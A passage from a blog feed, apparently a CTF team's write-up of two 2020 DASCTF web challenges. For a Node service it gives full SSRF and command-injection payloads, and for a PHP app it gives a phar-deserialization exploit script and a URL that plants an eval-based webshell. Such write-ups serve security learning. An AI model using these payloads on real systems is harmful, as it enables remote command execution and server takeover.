title="总结"></a>总结</h3><p>很有收获，不枉这两题，尤其的第二题，非常有价值。</p><p>当然不能小看第一题，别看WP短短几行，背后是无数次的尝试与探索，第二题更是如此。</p><p>2020年最后一份WP，还有很长路要走，加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020DASctf-Writeup</title>
      <link href="article/dasctf2020/"/>
      <url>article/dasctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p><p>队伍成员：</p><p>gyy，Trick，X06</p><p>队伍情况：</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range"><hr><p>继续学习吧，还是太菜了</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p><p>打开即为空的json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893"><p>给了源码，关键web逻辑<code>routes\index.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>data<span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p><p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p><p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p><p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p><p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'tp1'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp2'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp3'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p><p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p><p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p><p>利用脚本生成phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p><p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p><p>首先用<code>php://input</code>伪协议上传phar文件。</p><p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p><p>然后触发phar文件，利用<code>phar://</code>伪协议</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" 